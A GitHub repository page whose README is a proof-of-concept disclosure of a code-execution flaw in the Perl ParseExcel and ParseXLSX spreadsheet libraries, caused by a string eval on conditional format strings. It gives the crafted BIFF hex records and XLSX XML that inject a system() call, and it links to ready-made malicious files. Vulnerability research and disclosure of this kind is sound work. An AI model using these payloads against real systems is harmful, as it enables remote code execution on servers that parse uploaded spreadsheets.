  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=haile01%2Fperl_spreadsheet_excel_rce_poc)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[haile01](/haile01)
/
**[perl\_spreadsheet\_excel\_rce\_poc](/haile01/perl_spreadsheet_excel_rce_poc)**
Public

* [Notifications](/login?return_to=%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc) You must be signed in to change notification settings
* [Fork
  6](/login?return_to=%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc)
* [Star
   15](/login?return_to=%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc)

POC for RCE vulnerability in ParseExcel library, and ParseXLSX too, as a depending library

[15
stars](/haile01/perl_spreadsheet_excel_rce_poc/stargazers) [6
forks](/haile01/perl_spreadsheet_excel_rce_poc/forks) [Branches](/haile01/perl_spreadsheet_excel_rce_poc/branches) [Tags](/haile01/perl_spreadsheet_excel_rce_poc/tags) [Activity](/haile01/perl_spreadsheet_excel_rce_poc/activity)
 [Star](/login?return_to=%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc)

 [Notifications](/login?return_to=%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc) You must be signed in to change notification settings

* [Code](/haile01/perl_spreadsheet_excel_rce_poc)
* [Issues
  0](/haile01/perl_spreadsheet_excel_rce_poc/issues)
* [Pull requests
  0](/haile01/perl_spreadsheet_excel_rce_poc/pulls)
* [Actions](/haile01/perl_spreadsheet_excel_rce_poc/actions)
* [Projects
  0](/haile01/perl_spreadsheet_excel_rce_poc/projects)
* [Security](/haile01/perl_spreadsheet_excel_rce_poc/security)
* [Insights](/haile01/perl_spreadsheet_excel_rce_poc/pulse)

Additional navigation options

* [Code](/haile01/perl_spreadsheet_excel_rce_poc)
* [Issues](/haile01/perl_spreadsheet_excel_rce_poc/issues)
* [Pull requests](/haile01/perl_spreadsheet_excel_rce_poc/pulls)
* [Actions](/haile01/perl_spreadsheet_excel_rce_poc/actions)
* [Projects](/haile01/perl_spreadsheet_excel_rce_poc/projects)
* [Security](/haile01/perl_spreadsheet_excel_rce_poc/security)
* [Insights](/haile01/perl_spreadsheet_excel_rce_poc/pulse)

# haile01/perl\_spreadsheet\_excel\_rce\_poc

    main[Branches](/haile01/perl_spreadsheet_excel_rce_poc/branches)[Tags](/haile01/perl_spreadsheet_excel_rce_poc/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[4 Commits](/haile01/perl_spreadsheet_excel_rce_poc/commits/main/) | | |
| [poc](/haile01/perl_spreadsheet_excel_rce_poc/tree/main/poc "poc") | | [poc](/haile01/perl_spreadsheet_excel_rce_poc/tree/main/poc "poc") |  |  |
| [ParseXLSX\_0days.pptx](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/ParseXLSX_0days.pptx "ParseXLSX_0days.pptx") | | [ParseXLSX\_0days.pptx](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/ParseXLSX_0days.pptx "ParseXLSX_0days.pptx") |  |  |
| [README.md](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/README.md "README.md") | | [README.md](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/README.md "README.md") |  |  |
| [parse\_xlsx\_bomb.md](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/parse_xlsx_bomb.md "parse_xlsx_bomb.md") | | [parse\_xlsx\_bomb.md](/haile01/perl_spreadsheet_excel_rce_poc/blob/main/parse_xlsx_bomb.md "parse_xlsx_bomb.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# ParseExcel security vulnerabilitiy

> TL;DR: RCE from logic in parsing format strings.

## Short explanation on the exploit

Root cause of the exploitation comes from calling `eval` to an unvalidated user input in `Utility.pm`

<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/Utility.pm#L171>

```
# Uitlity.pm
sub ExcelFmt {
	my ( $format_str, $number, $is_1904, $number_type, $want_subformats ) = @_;

	return $number unless $number =~ $qrNUMBER;

	my $conditional;
	if ( $format_str =~ /^\[([<>=][^\]]+)\](.*)$/ ) {
		$conditional = $1;
		$format_str  = $2;
	}

	#...

	if ($conditional) {
		# TODO. Replace string eval with a function.
		$section = eval "$number $conditional" ? 0 : 1;
	}
    #...
}
```

According to what I inspected, current implementation for this flow lacks proper validation, while using `eval` for handling comparison logics is too "over kill" in this case. Because of this, both `ParseExcel::parse` and `ParseXLSX::parse` (used for reading data from Excel files) are vulnearble to RCE.

### Where's `$format_str`?

`ValFmt` is the most possible caller of `ExcelFmt`, so I'll explain further into this method
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L141-L161>

```
sub ValFmt {
    my ( $oThis, $oCell, $oBook ) = @_;

    my ( $Dt, $iFmtIdx, $iNumeric, $Flg1904 );

    if ( $oCell->{Type} eq 'Text' ) {
        $Dt =
          ( ( defined $oCell->{Val} ) && ( $oCell->{Val} ne '' ) )
          ? $oThis->TextFmt( $oCell->{Val}, $oCell->{Code} ) # Perform some encoding logic => doesn't cause RCE
          : '';

        return $Dt;
    }
    else {
        $Dt      = $oCell->{Val};
        $Flg1904 = $oBook->{Flg1904};
        my $sFmtStr = $oThis->FmtString( $oCell, $oBook );

        # where RCE lies => $oCell->{Type} must be either "Date" or "Number"
        return ExcelFmt( $sFmtStr, $Dt, $Flg1904, $oCell->{Type} );
    }
}
```

If `$oCell->{Type}` is `Date` or `Number`, `ExcelFmt` will be called.

The value `$format_str` is the returned from another method: `FmtString`
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L101-L136>

```
sub FmtString {
    my ( $oThis, $oCell, $oBook ) = @_;

    my $sFmtStr =
      $oThis->FmtStringDef( $oBook->{Format}[ $oCell->{FormatNo} ]->{FmtIdx},
        $oBook ); # maps to the correct format string

    #...

    unless ( defined($sFmtStr) ) {
        # assigns default format string depending on the value, can ignore
        #...
    }
    return $sFmtStr;
}
```

Another function is being called, so we'll examine `FmtStringDef` as well
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L87-L96>

```
sub FmtStringDef {
    my ( $oThis, $iFmtIdx, $oBook, $rhFmt ) = @_;
    my $sFmtStr = $oBook->{FormatStr}->{$iFmtIdx}; # does the mapping

    # More with assigning default format string, can ignore
    #...
}
```

All variables are clear, we can conclude the attack vector as follows:

* Inject the malicious format string with index `$iFmtIdx`
* Make sure a cell format `$oBook->{Format}[$cellFmtIdx]` maps to `$iFmtIdx`
* Make sure a cell maps to that cell format (`$oCell->{FormatNo} = $cellFmtIdx`)
  ![[flow 1.png]]

In the sections below, I'll go over detailed explanation of how the payload propagated the shell code to `eval` command. There will be 2 sections for parsing .xls file using `ParseExcel` and parsing .xlsx file using `ParseXLSX`.

## PoC

To demonstrate, below is the link to our crafted malicious Excel files (in .xls and .xlsx) that runs `whoami` and stores result to `/tmp/inject.txt` file.
<https://gist.github.com/haile01/0f4f19e4441895ef33ff27385080478b>

### Exploitation on XLS file

Take a simple Perl program to parse xls file like below, which uses `ParseExcel::parse`. RCE will happen while the parsing is performed, even before any data is fetched.

```
use strict;
use Spreadsheet::ParseExcel;

my $parser = Spreadsheet::ParseExcel->new();
# file.xls is malicious file from end user
my $workbook = $parser->parse("test.xls");
```

#### Injecting format string

Excel 97 binary files is structured in to chunks of binary data called BIFF record. Each record starts with a header called `opCode` (in little-endian), then the length of the record and it's actual data.

<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L438>

```
sub QueryNext {
    my ( $q ) = @_;

    if ( $q->{streamPos} + 4 >= $q->{streamLen} ) {
        return 0;
    }

    my $data = substr( $q->{stream}, $q->{streamPos}, 4 );

    ( $q->{opcode}, $q->{length} ) = unpack( 'v2', $data );

    # No biff record should be larger than around 20,000.
    if ( $q->{length} >= 20000 ) {
        return 0;
    }

    if ( $q->{length} > 0 ) {
        $q->{data} = substr( $q->{stream}, $q->{streamPos} + 4, $q->{length} );
    }
    else {
        $q->{data}                     = undef;
        $q->{dont_decrypt_next_record} = 1;
    }

    if ( $q->{encryption} == MS_BIFF_CRYPTO_RC4 ) {
        # Handles with decryption
    }
    elsif ( $q->{encryption} == MS_BIFF_CRYPTO_XOR ) {
        # not implemented
        return 0;
    }
    elsif ( $q->{encryption} == MS_BIFF_CRYPTO_NONE ) {

    }

    $q->{streamPos} += 4 + $q->{length};

    return 1;
}
```

After that, a corresponding handler for record type is used to extract that BIFF record data.
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L576-L580>

```
if ( defined $self->{FuncTbl}->{$record} && !$workbook->{_skip_chart} )
{
		$self->{FuncTbl}->{$record}
			->( $workbook, $record, $record_length, $record_header );
}
```

Format string is handled by `_subFormat`, with `opCode = 0x41E`
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L1563-L1585>

```
sub _subFormat {

    my ( $oBook, $bOp, $bLen, $sWk ) = @_;
    my $sFmt;

    if ( $oBook->{BIFFVersion} <= verBIFF5 ) {
        $sFmt = substr( $sWk, 3, unpack( 'c', substr( $sWk, 2, 1 ) ) );
        $sFmt = $oBook->{FmtClass}->TextFmt( $sFmt, '_native_' );
    }
    else {
        $sFmt = _convBIFF8String( $oBook, substr( $sWk, 2 ) );
    }

    my $format_index = unpack( 'v', substr( $sWk, 0, 2 ) );

    # Excel 4 and earlier used an index of 0 to indicate that a built-in format
    # that was stored implicitly.
    if ( $oBook->{BIFFVersion} <= verBIFF4 && $format_index == 0 ) {
        $format_index = keys %{ $oBook->{FormatStr} };
    }

    $oBook->{FormatStr}->{$format_index} = $sFmt;
}
```

I wasn't sure which BIFF version being used in my .xls file but according to the data in the binary file, it should match with the `else` case (> `verBIFF5`).

Structure of format string record in newer BIFF versions should be
**1E 04 [record length - 2 bytes] [format string index - 2 bytes] [format string length - 1 byte] [string flags - 2 bytes] [format string content]**

By following the correct structure, I can inject any format string into the .xls file.

The actual BIFF record for format string I injected in the PoC (format string index is `\x00\xa5`)

```
00000000: 1e04 3100 a500 2c00 005b 3e31 3233 3b73  ..1...,..[>123;s
                    ^^^^
		        format string index
00000010: 7973 7465 6d28 2777 686f 616d 6920 3e20  ystem('whoami >
00000020: 2f74 6d70 2f69 6e6a 6563 742e 7478 7427  /tmp/inject.txt'
00000030: 295d 3132 33                             )]123

```

#### Mapping a cell format to the format string

Cell formats will define many properties for a cell, such as format string, styling, fonts, ... One cell format can link to one format string by including format string's index inside their BIFF record. This logic is handled by `_subXf`
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L1441-L1558>

```
sub _subXF {
    my ( $oBook, $bOp, $bLen, $sWk ) = @_;

    #...

    if ( $oBook->{BIFFVersion} == verBIFF4 ) {
        #...
    }
    elsif ( $oBook->{BIFFVersion} == verBIFF8 ) {
        my ( $iGen, $iAlign, $iGen2, $iBdr1, $iBdr2, $iBdr3, $iPtn );

        ( $iFnt, $iIdx, $iGen, $iAlign, $iGen2, $iBdr1, $iBdr2, $iBdr3, $iPtn )
          = unpack( "v7Vv", $sWk );
        #...
    }
    else {
        ( $iFnt, $iIdx, $iGen, $iAlign, $iPtn, $iPtn2, $iBdr1, $iBdr2 ) =
          unpack( "v8", $sWk );
        #...
    }

    push @{ $oBook->{Format} }, Spreadsheet::ParseExcel::Format->new(
        FontNo => $iFnt,
        Font   => $oBook->{Font}[$iFnt],
        FmtIdx => $iIdx, # <- the index that points to format string index
        #...
    );
}
```

Because our `BIFFVersion` is greater than BIFF5, the condition shouldn't fall into the first case. For the other two, we know that `$iIdx` is the second word in BIFF data. That's why it's trivial to perform this step also.

The actual BIFF record for cell format I used in the PoC

```
00000000: e000 1400 0000 a500 f5ff 2000 0000 0000  .......... .....
                         ^^^^
                  format string index
00000010: 0000 0000 0000 c020                      .......

```

More over, cell formats are identified by its index in a list, so I modified the first record, then my cell format index should be `0`

#### Mapping a cell to the cell format

For a cell to apply a format, it should include the ID of the cell format inside the cell's BIFF record. However, as I mentioned before, only cell with type `Number` or `Date` can trigger the RCE, so I'll use a cell with date type for the PoC (refered as RK BIFF record).
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/19ea68d2ebf640e06df4f6937fcb43d76a5ec96b/lib/Spreadsheet/ParseExcel.pm#L918-L939>

```
sub _subRK {
    my ( $workbook, $biff_number, $length, $data ) = @_;
    my ( $row, $col, $format_index, $rk_number ) = unpack( 'vvvV', $data );
    my $number = _decode_rk_number( $rk_number );

    _NewCell(
        $workbook, $row, $col,
        Kind     => 'RK',
        Val      => $number,
        FormatNo => $format_index,
        Format   => $workbook->{Format}->[$format_index],
        Numeric  => 1,
        Code     => undef,
        Book     => $workbook,
    );
    #...
}
```

We can see that the index that maps to a cell format is now the third word of the record, so all we need to do is null-out this word into `\x00`

The actual BIFF record for date cell I used in the PoC

```
00000000: 7e02 0a00 0000 0000 0000 201a e240       ~......... ..@
                              ^^^^
	                        format index

```

Note that the method `_subRK` haven't explicitly define the type `Date` yet. Type checking is implemented in `chkType` instead
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel/FmtDefault.pm#L166-L181>

```
sub ChkType {
    my ( $oPkg, $iNumeric, $iFmtIdx ) = @_;
    if ($iNumeric) {
        if (   ( ( $iFmtIdx >= 0x0E ) && ( $iFmtIdx <= 0x16 ) )
            || ( ( $iFmtIdx >= 0x2D ) && ( $iFmtIdx <= 0x2F ) ) )
        {
            return "Date";
        }
        else {
            return "Numeric";
        }
    }
    else {
        return "Text";
    }
}
```

Since `$iNumeric` is set to `1`, we are sure that type is not `Text`

Finally, when initializing a new `Cell` object, `ValFmt` will be called and continue with the execution chain, propagate our shell to `eval` method.
<https://github.com/jmcnamara/spreadsheet-parseexcel/blob/e33d626d9b9cec91be7520dec1686712313957fb/lib/Spreadsheet/ParseExcel.pm#L2375-L2433>

### Exploitation on XLSX file

Working with .xlsx file is quite easier, since we can directly modify the data in plaintext (xml format).
Take a simple Perl program to parse xls file like below, which uses `ParseXLSX::parse`. RCE will happen while the parsing is performed, even before any data is fetched.

```
use strict;
use Spreadsheet::ParseExcel;
use Spreadsheet::ParseXLSX;

my $parser = Spreadsheet::ParseXLSX->new();
# file.xlsx is malicious file from end user
my $workbook = $parser->parse("test.xlsx");
```

XLSX file is a zip file that compresses many xml files, each containing specific types of data of the workbook.
Below is the example of folder structure:

```
|- [Content_Types].xml
|- _rels
|- docProps
	|- app.xml
	|- core.xml
|- xl
	|- _rels
		|- workbook.xml.rels
	|- styles.xml              <--- Format strings & cell formats
	|- workbook.xml
	|- sharedStrings.xml
	|- theme
		|- theme1.xml
	|- worksheets
		|- sheet1.xml            <--- Cell values

```

#### Injecting format string & mapping to a cell format

Format string is included in `xl/styles.xml` file, under `<numFmts>` tag, while cell formats are defined under `<cellXfs>` tag.
<https://github.com/doy/spreadsheet-parsexlsx/blob/80198923186bedda61d4dceb0272210dc8bec533/lib/Spreadsheet/ParseXLSX.pm#L630-L923>

```
sub _parse_styles {
    # ...
    my %format_str = (
        %default_format_str,
        (map {
            $_->att('numFmtId') => $_->att('formatCode')
        } $styles->find_nodes('//s:numFmts/s:numFmt')),
    );
    # ...
    my @format = map {
        my %opts = (
            %default_format_opts,
            %ignore,
        );
        # ...
        $opts{FmtIdx}   = 0+($xml_fmt->att('numFmtId')||0);
        # ...
        Spreadsheet::ParseExcel::Format->new(%opts)
    } $styles->find_nodes('//s:cellXfs/s:xf');
    # ...

    return {
        FormatStr => \%format_str,
        Font      => \@font,
        Format    => \@format,
    }
}
```

To inject a format string, we need to add a `<numFmt>` tag, with `formatCode` being the format string, and `numFmtId` being any integer value we want. Here I used `123`.

After that, we'll add one more `<xf>` cell to map to the format string, where `numFmtId` attribute being our chosen id (`123`)

The final xml data I used in the PoC

```
<!-- xl/styles.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:x16r2="http://schemas.microsoft.com/office/spreadsheetml/2015/02/main" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" mc:Ignorable="x14ac x16r2 xr">
...
  <numFmts count="1">
    <!-- injected format string -->
    <numFmt numFmtId="123" formatCode="[>123;system('whoami > /tmp/inject.txt')]123"/>
  </numFmts>
...
  <cellXfs count="4">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1"/>
    <!-- injected cell format -->
    <xf numFmtId="123" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1"/>
  </cellXfs>
...
</styleSheet>
```

#### Mapping a cell to the cell format

<https://github.com/doy/spreadsheet-parsexlsx/blob/80198923186bedda61d4dceb0272210dc8bec533/lib/Spreadsheet/ParseXLSX.pm#L205-L487>

```
sub _parse_sheet {
    my $sheet_xml = $self->_new_twig(
        twig_roots => {
            #...
            's:sheetData/s:row' => sub {
                my ( $twig, $row_elt ) = @_;
                for my $cell ( $row_elt->children('s:c') ){
                    my $type = $cell->att('t') || 'n';
                    my $val = $val_xml ? $val_xml->text : undef;

                    #...
                    elsif ($type eq 'n') {
                        $long_type = 'Numeric';
                        $val = defined($val) ? 0+$val : undef;
                    }
                    elsif ($type eq 'd') {
                        $long_type = 'Date';
                    }
                    # other $type results into $long_type = 'Text'
                    #...

                    my $format_idx = $cell->att('s') || 0;
                    my $format = $sheet->{_Book}{Format}[$format_idx];
                    die "unknown format $format_idx" unless $format;

                    my $cell = Spreadsheet::ParseExcel::Cell->new(
                        Val      => $val,
                        Type     => $long_type,
                        Merged   => undef, # fix up later
                        Format   => $format,
                        FormatNo => $format_idx,
                        ($formula
                            ? (Formula => $formula->text)
                            : ()),
                        Rich     => $Rich,
                    );
                    $cell->{_Value} = $sheet->{_Book}{FmtClass}->ValFmt(
                        $cell, $sheet->{_Book}
                    );
                }
            }
        }
    )
}
```

Logic for reading cell data in this library is more straightforward, only assign the type & value directly from xml tag attributes. Since we need `$oCell->{Type}` to be `Date` or `Numeric`, we just need attribute `t` to be `d` or `n`. To map the cell to the cell format, we'll also set attribute `s` to be the index of the cell format (`3`).

The final xml data I used in the PoC

```
<!-- xl/worksheets/sheet1.xml -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" mc:Ignorable="x14ac xr xr2 xr3" xr:uid="{39528CB2-0246-0542-84DC-33008C4AE4F2}">
  ...
  <sheetData>
    <row r="1" spans="1:2" x14ac:dyDescent="0.2">
      <c r="A1" s="3" t="n"> <!-- 3 is the order of our cell format -->
        <v>0</v>
      </c>
      <c r="B1" s="2"/>
    </row>
  </sheetData>
  ...
</worksheet>
`
```

## About

POC for RCE vulnerability in ParseExcel library, and ParseXLSX too, as a depending library

### Resources

[Readme](#readme-ov-file)

[Activity](/haile01/perl_spreadsheet_excel_rce_poc/activity)
### Stars

[**15**
stars](/haile01/perl_spreadsheet_excel_rce_poc/stargazers)
### Watchers

[**1**
watching](/haile01/perl_spreadsheet_excel_rce_poc/watchers)
### Forks

[**6**
forks](/haile01/perl_spreadsheet_excel_rce_poc/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fhaile01%2Fperl_spreadsheet_excel_rce_poc&report=haile01+%28user%29)

## [Releases](/haile01/perl_spreadsheet_excel_rce_poc/releases)

No releases published

## [Packages 0](/users/haile01/packages?repo_name=perl_spreadsheet_excel_rce_poc)

No packages published

## Languages

* [Python
  42.8%](/haile01/perl_spreadsheet_excel_rce_poc/search?l=python)
* [Perl
  33.7%](/haile01/perl_spreadsheet_excel_rce_poc/search?l=perl)
* [Dockerfile
  14.5%](/haile01/perl_spreadsheet_excel_rce_poc/search?l=dockerfile)
* [Shell
  9.0%](/haile01/perl_spreadsheet_excel_rce_poc/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


